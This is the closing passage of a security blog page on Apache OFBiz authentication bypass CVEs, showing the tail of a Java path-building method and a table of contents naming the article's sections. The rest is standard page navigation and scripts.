class="string">&#x27;?&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            nextPage = (nextPage == <span class="keyword">null</span> ? pathItem : nextPage + <span class="string">&quot;/&quot;</span> + pathItem);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nextPage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></article><div class="blog-post-comments"><div id="utterances_thread"><noscript>Please enable JavaScript to view the comments.</noscript></div></div><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul></div><div id="toc-footer" style="display:none"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E4%B8%8E%E9%89%B4%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">路由与鉴权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%85%E6%9E%90%E8%BF%9E%E7%BB%AD%E5%87%BA%E7%8E%B0%E4%B8%89%E6%AC%A1%E7%9A%84%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">浅析连续出现三次的权限绕过漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-25065"><span class="toc-number">3.1.</span> <span class="toc-text">CVE-2024-25065</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90"><span class="toc-number">3.1.1.</span> <span class="toc-text">权限绕过浅析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%BF%99%E5%8F%8A%E4%B8%AA%E8%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%BF%85%E9%A1%BB%E8%A6%81%E6%B1%82%E7%99%BB%E5%BD%95"><span class="toc-number">3.1.2.</span> <span class="toc-text">为什么这及个老漏洞利用必须要求登录</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-32113-CVE-2024-36104"><span class="toc-number">3.2.</span> <span class="toc-text">CVE-2024-32113&#x2F;CVE-2024-36104</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2024-38856%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">CVE-2024-38856权限绕过浅析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84%E7%82%B9"><span class="toc-number">5.</span> <span class="toc-text">可利用的点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E6%8A%97%E6%B5%81%E9%87%8F%E8%AE%BE%E5%A4%87%E7%9A%84%E7%82%B9"><span class="toc-number">6.</span> <span class="toc-text">对抗流量设备的点</span></a></li></ol></div><div id="share-footer" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/&text=Apache OFBiz Authentication Bypass(CVE-2024-38856)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/&title=Apache OFBiz Authentication Bypass(CVE-2024-38856)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/&is_video=false&description=Apache OFBiz Authentication Bypass(CVE-2024-38856)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=Apache OFBiz Authentication Bypass(CVE-2024-38856)&body=Check out this article: https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/&title=Apache OFBiz Authentication Bypass(CVE-2024-38856)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/&title=Apache OFBiz Authentication Bypass(CVE-2024-38856)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/&title=Apache OFBiz Authentication Bypass(CVE-2024-38856)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/&title=Apache OFBiz Authentication Bypass(CVE-2024-38856)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/&name=Apache OFBiz Authentication Bypass(CVE-2024-38856)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/&t=Apache OFBiz Authentication Bypass(CVE-2024-38856)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><a id="menu" class="icon" href="#" onclick='return $("#nav-footer").toggle(),!1'><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a> <a id="toc" class="icon" href="#" onclick='return $("#toc-footer").toggle(),!1'><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a> <a id="share" class="icon" href="#" onclick='return $("#share-footer").toggle(),!1'><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a> <a id="top" style="display:none" class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2016-2024 Y4tacker</div><div class="footer-right"><nav><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul><ul><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次 </span><span class="post-meta-divider">|</span> <span id="busuanzi_container_site_uv" style="display:none">本站访客数<span id="busuanzi_value_site_uv"></span>人</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></ul></nav></div></footer></div><link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload='this.onload=null,this.rel="stylesheet"'><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script><script type="text/javascript">$(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })</script><script src="/js/main.js"></script><script type="text/javascript">var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?e6d8a6d6d91254d9108e469862e88709";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><script type="text/javascript">var utterances_repo="Y4tacker/y4tacker.github.io",utterances_issue_term="pathname",utterances_label="Comment",utterances_theme="github-dark";!function(){var t=document.createElement("script");t.src="https://utteranc.es/client.js",t.setAttribute("repo",utterances_repo),t.setAttribute("issue-term","pathname"),t.setAttribute("label",utterances_label),t.setAttribute("theme",utterances_theme),t.setAttribute("crossorigin","anonymous"),t.async=!0,document.getElementById("utterances_thread").appendChild(t)}()</script></body></html>